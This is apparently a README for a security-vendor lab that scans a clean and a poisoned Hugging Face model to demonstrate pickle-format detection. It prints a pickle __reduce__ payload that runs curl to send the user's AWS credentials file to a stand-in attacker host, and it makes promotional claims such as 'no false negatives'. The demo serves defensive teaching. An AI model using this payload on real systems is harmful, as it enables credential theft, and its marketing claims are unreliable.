# Prisma AIRS Model Security LAB

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)

This repo was created using https://github.com/scthornton/deserialization-model-demo as a base. Credits to Scott for his pioneer work!

## Getting Started

### Prerequisites

You'll need a few details at hand before running this:
- A service account, TSG ID and security group GUID from your relevant PANW SCM tenant
- This repo cloned to your machine

### Getting Prisma AIRS Credentials

To obtain Prisma AIRS credentials:

1. **Log in to Strata Cloud Manager:** https://stratacloudmanager.paloaltonetworks.com
2. **Create Service Account:**
   - Navigate to: Settings → Identity & Access → Service Accounts
   - Click "Add Service Account"
   - Select appropriate permissions
   - Save and copy the Client ID and Client Secret (shown once!)
3. **Get TSG ID:**
   - Navigate to: Tenant Management
   - Copy your Tenant Service Group (TSG) ID
4. **Get security group GUID:**
   - Navigate to: Insights --> AI Model Security --> Model Security Groups
   - Chose the relevant one (Huggingface used in the examples)
   - Copy the GUID from the context menu on the right hand side.

### Local setup

1. **Clone this repository:**
   ```bash
   git clone https://github.com/jansvensen/panw-airs-lab-modelsecurity.git
   cd panw-airs-lab-modelsecurity
   ```

2. **Create your .env file:**
The .env file contains your relevant variables.
- copy ".env.example" to ".env"
- edit the values to match your environment

### Installation

The installation is automated wherever possible. Use "setup-lab.sh" to
- implement a python venv on your local system
- install all dependencies

   ```bash
   chmod +x *.sh
   setup-lab.sh
   ```

## Demo Flow

### Prep: Activate venv
You'll need to get inside the created venv to run your scans.

   ```bash   
   source venv/bin/activate
   ```

### Part 1: Clean Model Scan

Scan `amazon/chronos-t5-small`, a clean model chosen for easy scanning.
   ```bash   
   ./run-scan.sh "https://huggingface.co/amazon/chronos-t5-small"
   ```

### Part 2: Poisoned Model Scan

Scan `scthornton/chronos-t5-small-poisoned-demo`, identical to the clean model but with a malicious pickle file added:
   ```bash
   ./run-scan.sh "https://huggingface.co/scthornton/chronos-t5-small-poisoned-demo" 
   ```

### Part 3: Analysis & Value Proposition

- Side-by-side comparison of results
- Explanation of detection mechanism
- ROI calculation (average data breach: $4.45M)
- Technical deep dive

## The Attack Explained

### What is Pickle Deserialization?

Python's `pickle` module allows objects to be serialized and deserialized. However, it's unsafe for untrusted data because it can execute arbitrary code during deserialization.

### Exploit Code

```python
import pickle

class MaliciousCheckpoint:
    def __reduce__(self):
        import os
        return (
            os.system,
            ("curl -X POST https://attacker-c2.com/exfil -d @$HOME/.aws/credentials",)
        )

# When victim loads this:
with open('malicious_checkpoint.pkl', 'rb') as f:
    checkpoint = pickle.load(f)  # ← CODE EXECUTES HERE
    # AWS credentials sent to attacker before user realizes
```

### Impact

- **Automatic Execution:** Code runs during `pickle.load()`, before user can inspect
- **Full System Access:** Can execute any system command via `os.system()`
- **Credential Theft:** Steals AWS credentials, API keys, tokens
- **Real-World Threat:** Documented in actual ML supply chain attacks

## How Prisma AIRS Detects This

**Detection Method:** File Format Policy Enforcement

Prisma AIRS blocks the pickle **file format** itself, not just specific exploits. This is because:

1. **Pickle is inherently unsafe** - Allows arbitrary code execution by design
2. **Cannot be secured** - No way to "safely" load untrusted pickle files
3. **Zero-trust approach** - Block entire format category

**Benefits:**
- ✅ Cannot be bypassed with sophisticated payloads
- ✅ Blocks entire class of deserialization attacks
- ✅ Simple, fast, reliable
- ✅ No false negatives

## Use Cases

### For Security Teams

- Demonstrate ML supply chain security risks to stakeholders
- Educate developers on pickle deserialization threats
- Validate security controls before model deployment
- Create security awareness training materials

### For Sales & Marketing

- Live product demonstrations
- Customer proof-of-concept
- ROI justification
- Competitive differentiation

### For Developers

- Learn about ML security best practices
- Understand CWE-502 vulnerabilities
- See Prisma AIRS SDK integration examples
- Adapt for CI/CD pipeline integration

## Business Value

**Without Prisma AIRS:**
- Malicious models deployed to production
- Credential theft, data exfiltration, ransomware
- Average data breach cost: $4.45M (IBM, 2024)

**With Prisma AIRS:**
- Models scanned before deployment
- Pickle attacks blocked automatically
- Attack prevented at $0 cost

**ROI:** One blocked pickle attack pays for Prisma AIRS 10x over

## Security Considerations

⚠️ **Important:** This demo contains educational exploit code for demonstration purposes only.

- Models used in this demo are for **educational purposes only**
- The malicious model is hosted publicly to demonstrate detection
- Do NOT use these techniques against systems you don't own
- See [SECURITY.md](SECURITY.md) for our security policy

## Contributing

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## License

This project is licensed under the MIT License - see [LICENSE](LICENSE) file for details.

## Support

- **Documentation:** https://docs.paloaltonetworks.com/prisma/prisma-airs
- **Issues:** Please open a GitHub issue for bugs or feature requests
- **Community:** Join the discussion in GitHub Discussions

## Acknowledgments

- **Palo Alto Networks** - For Prisma AIRS Model Security
- **Amazon** - For the chronos-t5-small base model
- **HuggingFace** - For model hosting infrastructure

## Related Resources

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Prisma AIRS Documentation](https://docs.paloaltonetworks.com/prisma/prisma-airs)
- [ML Supply Chain Security Best Practices](https://docs.paloaltonetworks.com/prisma/prisma-airs/best-practices)
